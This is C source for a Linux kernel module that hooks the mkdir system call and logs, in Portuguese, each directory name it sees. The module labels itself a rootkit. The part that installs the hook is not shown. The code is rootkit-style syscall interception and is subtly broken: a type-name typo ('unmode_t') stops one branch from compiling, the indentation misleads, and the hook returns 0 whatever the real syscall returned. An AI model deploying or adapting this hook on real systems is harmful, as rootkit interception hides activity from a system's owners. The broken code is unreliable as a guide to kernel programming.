#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("l0gic");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*org_mkdir)(const struct pt_regs *);

asmlinkage int Hook_no_Mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "Root kit: tentou criar o direito com o nome de : %s\n", dir_name);
        org_mkdir(regs);
        return 0; 
}
#else
static asmlinkage long (*org_mkdir)(const char __user *pathname, umode_t mode);

asmlinkage int Hook_no_Mkdir(const char __user *pathname, unmode_t mode)
{
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0)
        printk(KERN_INFO "Root kit: tentou criar o direito com o nome de : %s\n", dir_name);
        org_mkdir(pathname, mode);
        return 0;
}
#endif

